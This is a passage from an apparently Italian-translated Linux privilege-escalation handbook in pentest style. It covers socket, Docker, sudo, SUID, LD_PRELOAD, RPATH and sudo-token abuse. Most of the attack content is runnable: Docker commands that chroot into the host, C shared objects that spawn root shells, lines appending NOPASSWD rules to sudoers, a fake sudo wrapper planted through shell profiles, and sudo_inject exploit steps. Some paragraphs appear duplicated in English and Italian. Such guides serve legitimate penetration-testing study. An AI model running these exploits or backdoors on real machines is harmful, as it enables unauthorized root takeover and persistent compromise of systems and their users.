* `Accept`: Prende un argomento booleano. Se **true**, viene generata un'**istanza di servizio per ogni connessione in entrata** e solo il socket di connessione viene passato ad essa. Se **false**, tutti i socket di ascolto stessi vengono **passati all'unità di servizio avviata**, e viene generata solo un'unità di servizio per tutte le connessioni. Questo valore viene ignorato per i socket datagram e FIFO in cui un'unica unità di servizio gestisce incondizionatamente tutto il traffico in entrata. **Il valore predefinito è false**. Per motivi di prestazioni, si consiglia di scrivere nuovi daemon solo in un modo adatto a `Accept=no`.
* `ExecStartPre`, `ExecStartPost`: Prende una o più righe di comando, che vengono **eseguite prima** o **dopo** la creazione e il collegamento dei **socket**/FIFO di ascolto, rispettivamente. Il primo token della riga di comando deve essere un nome di file assoluto, seguito dagli argomenti per il processo.
* `ExecStopPre`, `ExecStopPost`: Comandi aggiuntivi che vengono **eseguiti prima** o **dopo** la chiusura e la rimozione dei **socket**/FIFO di ascolto, rispettivamente.
* `Service`: Specifica il nome dell'unità di **servizio da attivare** sul **traffico in entrata**. Questa impostazione è consentita solo per i socket con Accept=no. Il valore predefinito è il servizio che ha lo stesso nome del socket (con il suffisso sostituito). Nella maggior parte dei casi, non dovrebbe essere necessario utilizzare questa opzione.

### File .socket scrivibili

Se trovi un file `.socket` **scrivibile**, puoi **aggiungere** all'inizio della sezione `[Socket]` qualcosa del tipo: `ExecStartPre=/home/kali/sys/backdoor` e la backdoor verrà eseguita prima che il socket venga creato. Pertanto, probabilmente dovrai **aspettare che la macchina venga riavviata**.\
_Nota che il sistema deve utilizzare quella configurazione del file socket o la backdoor non verrà eseguita_

### Socket scrivibili

Se **identifichi un socket scrivibile** (_ora stiamo parlando di Socket Unix e non dei file di configurazione `.socket`_), allora **puoi comunicare** con quel socket e forse sfruttare una vulnerabilità.

### Enumerare i Socket Unix
```bash
netstat -a -p --unix
```
### Connessione raw

To establish a raw connection to a remote host, you can use tools like `netcat` or `nc`. These tools allow you to interact with the remote host at a low level, sending and receiving raw data.

Per stabilire una connessione raw con un host remoto, è possibile utilizzare strumenti come `netcat` o `nc`. Questi strumenti ti consentono di interagire con l'host remoto a un livello basso, inviando e ricevendo dati grezzi.

Here's an example of how to establish a raw connection using `netcat`:

Ecco un esempio di come stabilire una connessione raw utilizzando `netcat`:

```bash
nc <remote_host> <port>
```

Replace `<remote_host>` with the IP address or hostname of the remote host, and `<port>` with the port number you want to connect to.

Sostituisci `<remote_host>` con l'indirizzo IP o il nome host dell'host remoto e `<port>` con il numero di porta a cui desideri connetterti.

Once the connection is established, you can send and receive data directly. This can be useful for testing network services or debugging network protocols.

Una volta stabilita la connessione, è possibile inviare e ricevere dati direttamente. Questo può essere utile per testare servizi di rete o debug di protocolli di rete.
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Esempio di sfruttamento:**

{% content-ref url="socket-command-injection.md" %}
[socket-command-injection.md](socket-command-injection.md)
{% endcontent-ref %}

### Sockets HTTP

Nota che potrebbero esserci alcuni **sockets in ascolto per richieste HTTP** (_Non sto parlando di file .socket ma di file che agiscono come socket Unix_). Puoi verificarlo con:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
Se il socket **risponde con una richiesta HTTP**, allora puoi **comunicare** con esso e forse **sfruttare qualche vulnerabilità**.

### Socket Docker scrivibile

Il socket Docker, spesso trovato in `/var/run/docker.sock`, è un file critico che dovrebbe essere protetto. Di default, è scrivibile dall'utente `root` e dai membri del gruppo `docker`. Possedere l'accesso in scrittura a questo socket può portare ad un'escalation dei privilegi. Ecco come può essere fatto e i metodi alternativi se il Docker CLI non è disponibile.

#### **Escalation dei privilegi con Docker CLI**

Se hai l'accesso in scrittura al socket Docker, puoi aumentare i privilegi utilizzando i seguenti comandi:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Questi comandi ti consentono di eseguire un container con accesso di livello root al file system dell'host.

#### **Utilizzo diretto dell'API Docker**

Nei casi in cui non sia disponibile l'interfaccia della riga di comando di Docker, è comunque possibile manipolare il socket Docker utilizzando l'API Docker e i comandi `curl`.

1. **Elenco delle immagini Docker:**
Recupera l'elenco delle immagini disponibili.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2. **Creazione di un container:**
Invia una richiesta per creare un container che monta la directory radice del sistema dell'host.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Avvia il container appena creato:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3. **Collegamento al container:**
Utilizza `socat` per stabilire una connessione al container, consentendo l'esecuzione di comandi al suo interno.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

Dopo aver configurato la connessione `socat`, puoi eseguire comandi direttamente nel container con accesso di livello root al file system dell'host.

### Altri metodi

Nota che se hai i permessi di scrittura sul socket di Docker perché sei **all'interno del gruppo `docker`**, hai [**altri modi per ottenere privilegi elevati**](interesting-groups-linux-pe/#docker-group). Se l'[**API di Docker è in ascolto su una porta**, potresti anche essere in grado di comprometterla](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Verifica **altri modi per eludere Docker o sfruttarlo per ottenere privilegi elevati** in:

{% content-ref url="docker-security/" %}
[docker-security](docker-security/)
{% endcontent-ref %}

## Escalation dei privilegi di Containerd (ctr)

Se scopri di poter utilizzare il comando **`ctr`**, leggi la seguente pagina poiché **potresti essere in grado di sfruttarlo per ottenere privilegi elevati**:

{% content-ref url="containerd-ctr-privilege-escalation.md" %}
[containerd-ctr-privilege-escalation.md](containerd-ctr-privilege-escalation.md)
{% endcontent-ref %}

## Escalation dei privilegi di **RunC**

Se scopri di poter utilizzare il comando **`runc`**, leggi la seguente pagina poiché **potresti essere in grado di sfruttarlo per ottenere privilegi elevati**:

{% content-ref url="runc-privilege-escalation.md" %}
[runc-privilege-escalation.md](runc-privilege-escalation.md)
{% endcontent-ref %}

## **D-Bus**

D-Bus è un sofisticato sistema di **comunicazione inter-processo (IPC)** che consente alle applicazioni di interagire ed condividere dati in modo efficiente. Progettato con il sistema Linux moderno in mente, offre un framework robusto per diverse forme di comunicazione tra applicazioni.

Il sistema è versatile, supportando IPC di base che migliora lo scambio di dati tra processi, simile ai **socket di dominio UNIX migliorati**. Inoltre, aiuta nella trasmissione di eventi o segnali, favorisce l'integrazione senza soluzione di continuità tra i componenti di sistema. Ad esempio, un segnale da un demone Bluetooth su una chiamata in arrivo può far sì che un lettore musicale si metta in silenzio, migliorando l'esperienza dell'utente. Inoltre, D-Bus supporta un sistema di oggetti remoti, semplificando le richieste di servizio e le invocazioni di metodi tra applicazioni, razionalizzando processi tradizionalmente complessi.

D-Bus opera su un modello di **consenso/negazione**, gestendo le autorizzazioni dei messaggi (chiamate di metodo, emissioni di segnali, ecc.) in base all'effetto cumulativo delle regole di politica corrispondenti. Queste politiche specificano le interazioni con il bus, consentendo potenzialmente l'escalation dei privilegi attraverso lo sfruttamento di queste autorizzazioni.

Viene fornito un esempio di tale politica in `/etc/dbus-1/system.d/wpa_supplicant.conf`, che dettaglia le autorizzazioni per l'utente root per possedere, inviare e ricevere messaggi da `fi.w1.wpa_supplicant1`.

Le politiche senza un utente o gruppo specificato si applicano universalmente, mentre le politiche di contesto "default" si applicano a tutti quelli non coperti da altre politiche specifiche.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Scopri come enumerare e sfruttare una comunicazione D-Bus qui:**

{% content-ref url="d-bus-enumeration-and-command-injection-privilege-escalation.md" %}
[d-bus-enumeration-and-command-injection-privilege-escalation.md](d-bus-enumeration-and-command-injection-privilege-escalation.md)
{% endcontent-ref %}

## **Rete**

È sempre interessante enumerare la rete e capire la posizione della macchina.

### Enumerazione generica
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Porte aperte

Verifica sempre i servizi di rete in esecuzione sulla macchina con cui non sei stato in grado di interagire prima di accedervi:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

Verifica se puoi fare sniffing del traffico. Se puoi, potresti essere in grado di ottenere delle credenziali.
```
timeout 1 tcpdump
```
## Utenti

### Enumerazione generica

Controlla **chi** sei, quali **privilegi** hai, quali **utenti** sono presenti nel sistema, quali possono **effettuare il login** e quali hanno **privilegi di root:**
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Big UID

Alcune versioni di Linux sono state colpite da un bug che consente agli utenti con **UID > INT\_MAX** di ottenere privilegi elevati. Maggiori informazioni: [qui](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [qui](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) e [qui](https://twitter.com/paragonsec/status/1071152249529884674).\
**Sfruttalo** utilizzando: **`systemd-run -t /bin/bash`**

### Gruppi

Verifica se sei **membro di qualche gruppo** che potrebbe concederti privilegi di root:

{% content-ref url="interesting-groups-linux-pe/" %}
[interesting-groups-linux-pe](interesting-groups-linux-pe/)
{% endcontent-ref %}

### Appunti

Verifica se ci sono informazioni interessanti negli appunti (se possibile)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Politica delle password

La politica delle password è un insieme di regole che definiscono i requisiti per la creazione e l'utilizzo delle password. Una password sicura è essenziale per proteggere i sistemi e i dati sensibili da accessi non autorizzati. Di seguito sono riportate alcune linee guida comuni per una politica delle password robusta:

- **Complessità**: Le password dovrebbero essere complesse e difficili da indovinare. Devono contenere una combinazione di lettere maiuscole e minuscole, numeri e caratteri speciali.

- **Lunghezza**: Le password dovrebbero essere lunghe almeno 8 caratteri. Più lunga è la password, più difficile sarà da indovinare.

- **Cambi frequenti**: Le password dovrebbero essere cambiate regolarmente, ad esempio ogni 90 giorni. Questo riduce il rischio di compromissione delle password a causa di eventuali violazioni dei dati.

- **Non riutilizzare**: Le password non dovrebbero essere riutilizzate per più account. Ogni account dovrebbe avere una password unica.

- **Blocco degli account**: Dopo un certo numero di tentativi falliti di accesso, l'account dovrebbe essere bloccato per un determinato periodo di tempo. Questo aiuta a prevenire attacchi di forza bruta.

- **Autenticazione a due fattori**: L'autenticazione a due fattori aggiunge un ulteriore livello di sicurezza richiedendo un secondo metodo di verifica, come un codice inviato via SMS o un'applicazione di autenticazione.

Seguire una politica delle password rigorosa è fondamentale per proteggere i sistemi e i dati da accessi non autorizzati.
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Password conosciute

Se conosci **una password** dell'ambiente, prova ad effettuare il login come ogni utente utilizzando la password.

### Su Brute

Se non ti importa di fare molto rumore e i binari `su` e `timeout` sono presenti sul computer, puoi provare a forzare l'accesso utente utilizzando [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) con il parametro `-a` prova anche a forzare l'accesso utente.

## Abusi di PATH scrivibili

### $PATH

Se scopri che puoi **scrivere all'interno di una cartella del $PATH**, potresti essere in grado di ottenere privilegi elevati creando un backdoor all'interno della cartella scrivibile con il nome di un comando che verrà eseguito da un utente diverso (idealmente root) e che **non viene caricato da una cartella che si trova prima** della tua cartella scrivibile nel $PATH.

### SUDO e SUID

Potresti essere autorizzato ad eseguire alcuni comandi utilizzando sudo o potrebbero avere il bit suid. Verificalo utilizzando:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Alcuni **comandi imprevisti ti consentono di leggere e/o scrivere file o addirittura eseguire un comando**. Ad esempio:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

La configurazione di Sudo potrebbe consentire a un utente di eseguire un comando con i privilegi di un altro utente senza conoscere la password.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
In questo esempio l'utente `demo` può eseguire `vim` come `root`, ora è banale ottenere una shell aggiungendo una chiave ssh nella directory root o chiamando `sh`.
```
sudo vim -c '!sh'
```
### SETENV

Questa direttiva consente all'utente di **impostare una variabile di ambiente** durante l'esecuzione di qualcosa:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Questo esempio, **basato sulla macchina HTB Admirer**, era **vulnerabile** all'**hijacking di PYTHONPATH** per caricare una libreria python arbitraria durante l'esecuzione dello script come root:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### Bypass di esecuzione di Sudo tramite percorsi

**Saltare** per leggere altri file o utilizzare **symlink**. Ad esempio nel file sudoers: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Se viene utilizzato un **jolly** (\*), è ancora più facile:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Contromisure**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Comando Sudo/binario SUID senza percorso del comando

Se viene dato il **permesso sudo** a un singolo comando **senza specificare il percorso**: _hacker10 ALL= (root) less_, è possibile sfruttarlo modificando la variabile PATH.
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Questa tecnica può essere utilizzata anche se un binario **suid** esegue un altro comando senza specificarne il percorso (verifica sempre con **strings** il contenuto di un binario SUID insolito).

[Esempi di payload da eseguire.](payloads-to-execute.md)

### Binario SUID con percorso del comando

Se il binario **suid** esegue un altro comando specificando il percorso, allora puoi provare a **esportare una funzione** con lo stesso nome del comando che il file suid sta chiamando.

Ad esempio, se un binario suid chiama _**/usr/sbin/service apache2 start**_, devi provare a creare la funzione e esportarla:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Quindi, quando si chiama il binario suid, questa funzione verrà eseguita

### LD\_PRELOAD & **LD\_LIBRARY\_PATH**

La variabile d'ambiente **LD_PRELOAD** viene utilizzata per specificare una o più librerie condivise (.so) da caricare dal loader prima di tutte le altre, inclusa la libreria C standard (`libc.so`). Questo processo è noto come preloading di una libreria.

Tuttavia, per mantenere la sicurezza del sistema e impedire che questa funzionalità venga sfruttata, in particolare con eseguibili **suid/sgid**, il sistema applica determinate condizioni:

- Il loader ignora **LD_PRELOAD** per gli eseguibili in cui l'ID utente reale (_ruid_) non corrisponde all'ID utente effettivo (_euid_).
- Per gli eseguibili con suid/sgid, vengono pre-caricate solo le librerie nei percorsi standard che sono anche suid/sgid.

L'elevazione dei privilegi può verificarsi se si ha la possibilità di eseguire comandi con `sudo` e l'output di `sudo -l` include l'istruzione **env_keep+=LD_PRELOAD**. Questa configurazione consente alla variabile d'ambiente **LD_PRELOAD** di persistere e essere riconosciuta anche quando i comandi vengono eseguiti con `sudo`, potenzialmente portando all'esecuzione di codice arbitrario con privilegi elevati.
```
Defaults        env_keep += LD_PRELOAD
```
Salva come **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Quindi **compilalo** usando:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Infine, **aumentare i privilegi** in esecuzione
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
{% hint style="danger" %}
Un privesc simile può essere sfruttato se l'attaccante controlla la variabile di ambiente **LD\_LIBRARY\_PATH** perché controlla il percorso in cui verranno cercate le librerie.
{% endhint %}
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary - Iniezione di .so

Quando si incontra un binario con permessi **SUID** che sembra insolito, è una buona pratica verificare se carica correttamente i file **.so**. Questo può essere verificato eseguendo il seguente comando:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Ad esempio, incontrare un errore come _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (File o directory non esistente)"_ suggerisce un potenziale per l'exploit.

Per sfruttare ciò, si procederebbe creando un file C, diciamo _"/path/to/.config/libcalc.c"_, contenente il seguente codice:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Questo codice, una volta compilato ed eseguito, mira ad elevare i privilegi manipolando i permessi dei file ed eseguendo una shell con privilegi elevati.

Compila il file C sopra in un file oggetto condiviso (.so) con:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Infine, l'esecuzione del binario SUID interessato dovrebbe attivare l'exploit, consentendo un potenziale compromesso del sistema.


## Hijacking di oggetti condivisi
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Ora che abbiamo trovato un binario SUID che carica una libreria da una cartella in cui possiamo scrivere, creiamo la libreria in quella cartella con il nome necessario:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Se si verifica un errore come
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
Ciò significa che la libreria che hai generato deve avere una funzione chiamata `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) è una lista curata di binari Unix che possono essere sfruttati da un attaccante per eludere le restrizioni di sicurezza locali. [**GTFOArgs**](https://gtfoargs.github.io/) è la stessa cosa, ma per i casi in cui è possibile **iniettare solo argomenti** in un comando.

Il progetto raccoglie funzioni legittime dei binari Unix che possono essere abusate per rompere le shell restrittive, elevare o mantenere i privilegi elevati, trasferire file, generare shell bind e reverse e facilitare altre attività di post-exploitation.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'

{% embed url="https://gtfobins.github.io/" %}

{% embed url="https://gtfoargs.github.io/" %}

### FallOfSudo

Se puoi accedere a `sudo -l`, puoi utilizzare lo strumento [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) per verificare se trova un modo per sfruttare una regola sudo.

### Riutilizzo dei token di Sudo

Nei casi in cui hai **accesso sudo** ma non la password, puoi elevare i privilegi **attendendo l'esecuzione di un comando sudo e quindi dirottando il token di sessione**.

Requisiti per l'elevazione dei privilegi:

* Hai già una shell come utente "_sampleuser_"
* "_sampleuser_" ha **usato `sudo`** per eseguire qualcosa negli **ultimi 15 minuti** (per impostazione predefinita, questa è la durata del token sudo che ci consente di utilizzare `sudo` senza inserire alcuna password)
* `cat /proc/sys/kernel/yama/ptrace_scope` è 0
* `gdb` è accessibile (puoi essere in grado di caricarlo)

(Puoi abilitare temporaneamente `ptrace_scope` con `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` o modificare permanentemente `/etc/sysctl.d/10-ptrace.conf` e impostare `kernel.yama.ptrace_scope = 0`)

Se tutti questi requisiti sono soddisfatti, **puoi elevare i privilegi utilizzando:** [**https://github.com/nongiach/sudo\_inject**](https://github.com/nongiach/sudo\_inject)

* La **prima vulnerabilità** (`exploit.sh`) creerà il binario `activate_sudo_token` in _/tmp_. Puoi usarlo per **attivare il token sudo nella tua sessione** (non otterrai automaticamente una shell di root, esegui `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
* Il **secondo exploit** (`exploit_v2.sh`) creerà una shell sh in _/tmp_ **di proprietà di root con setuid**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
*Il **terzo exploit** (`exploit_v3.sh`) **creerà un file sudoers** che rende **i token sudo eterni e consente a tutti gli utenti di utilizzare sudo**.*
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

Se hai **permessi di scrittura** nella cartella o su uno dei file creati all'interno della cartella, puoi utilizzare il binario [**write\_sudo\_token**](https://github.com/nongiach/sudo\_inject/tree/master/extra\_tools) per **creare un token sudo per un utente e PID**.\
Ad esempio, se puoi sovrascrivere il file _/var/run/sudo/ts/sampleuser_ e hai una shell come quell'utente con PID 1234, puoi **ottenere i privilegi sudo** senza dover conoscere la password eseguendo:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

Il file `/etc/sudoers` e i file all'interno di `/etc/sudoers.d` configurano chi può utilizzare `sudo` e come. Questi file **di default possono essere letti solo dall'utente root e dal gruppo root**.\
**Se** riesci a **leggere** questo file potresti essere in grado di **ottenere alcune informazioni interessanti**, e se riesci a **scrivere** su qualsiasi file sarai in grado di **aumentare i privilegi**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Se sei in grado di scrivere, puoi abusare di questa autorizzazione.
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Un altro modo per abusare di queste autorizzazioni:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Ci sono alcune alternative al binario `sudo`, come `doas` per OpenBSD, ricorda di controllare la sua configurazione in `/etc/doas.conf`.
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

Se sai che un **utente di solito si connette a una macchina e utilizza `sudo`** per ottenere privilegi elevati e hai una shell all'interno del contesto di quell'utente, puoi **creare un nuovo eseguibile sudo** che eseguirà il tuo codice come root e quindi il comando dell'utente. Successivamente, **modifica il $PATH** del contesto dell'utente (ad esempio aggiungendo il nuovo percorso in .bash\_profile) in modo che quando l'utente esegue sudo, venga eseguito il tuo eseguibile sudo.

Nota che se l'utente utilizza una shell diversa (non bash), dovrai modificare altri file per aggiungere il nuovo percorso. Ad esempio, [sudo-piggyback](https://github.com/APTy/sudo-piggyback) modifica `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Puoi trovare un altro esempio in [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire\_modules/bashdoor.py)

Oppure eseguendo qualcosa come:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Libreria condivisa

### ld.so

Il file `/etc/ld.so.conf` indica **da dove vengono caricati i file di configurazione**. Tipicamente, questo file contiene il seguente percorso: `include /etc/ld.so.conf.d/*.conf`

Ciò significa che i file di configurazione da `/etc/ld.so.conf.d/*.conf` verranno letti. Questi file di configurazione **puntano ad altre cartelle** in cui verranno **ricercate le librerie**. Ad esempio, il contenuto di `/etc/ld.so.conf.d/libc.conf` è `/usr/local/lib`. **Ciò significa che il sistema cercherà le librerie all'interno di `/usr/local/lib`**.

Se per qualche motivo **un utente ha i permessi di scrittura** su uno dei percorsi indicati: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, qualsiasi file all'interno di `/etc/ld.so.conf.d/` o qualsiasi cartella all'interno del file di configurazione in `/etc/ld.so.conf.d/*.conf`, potrebbe essere in grado di ottenere privilegi elevati.\
Dai un'occhiata a **come sfruttare questa errata configurazione** nella seguente pagina:

{% content-ref url="ld.so.conf-example.md" %}
[ld.so.conf-example.md](ld.so.conf-example.md)
{% endcontent-ref %}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Copiando la libreria in `/var/tmp/flag15/`, verrà utilizzata dal programma in questo percorso come specificato nella variabile `RPATH`.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Quindi crea una libreria malevola in `/var/tmp` con `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Capacità

Le capacità di Linux forniscono a un processo un **sottoinsieme dei privilegi di root disponibili**. Questo suddivide efficacemente i privilegi di root in unità più piccole e distinte. Ciascuna di queste unità può quindi essere concessa in modo indipendente ai processi. In questo modo, l'insieme completo dei privilegi viene ridotto, diminuendo i rischi di sfruttamento.\
Leggi la seguente pagina per **saperne di più sulle capacità e su come abusarne**:

{% content-ref url="linux-capabilities.md" %}
[linux-capabilities.md](linux-capabilities.md)
{% endcontent-ref %}

## Permessi delle directory

In una directory, il **bit "execute"** implica che l'utente interessato può "**cd**" nella cartella.\
Il bit **"read"** implica che l'utente può **elencare** i **file**, e il bit **"write"** implica che l'utente può **eliminare** e **creare** nuovi **file**.

## ACL

Le Access Control List (ACL) rappresentano il livello secondario dei permessi discrezionali, in grado di **sovrascrivere i permessi tradizionali ugo/rwx**. Questi permessi migliorano il controllo sull'accesso ai file o alle directory consentendo o negando i diritti a utenti specifici che non sono proprietari o parte del gruppo. Questo livello di **granularità garantisce una gestione dell'accesso più precisa**. Ulteriori dettagli possono essere trovati [**qui**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Dai** all'utente "kali" i permessi di lettura e scrittura su un file:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Ottieni** i file con ACL specifiche dal sistema:

```bash
getfacl -R / 2>/dev/null | grep -E "user::rwx|group::rwx|other::rwx" | awk -F: '{print $1}' | sort -u
```

Questo comando restituirà una lista dei file nel sistema che hanno le ACL specificate per l'utente, il gruppo e gli altri.
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## Sessioni shell aperte

Nelle **versioni vecchie** potresti **intercettare** una sessione **shell** di un utente diverso (**root**).\
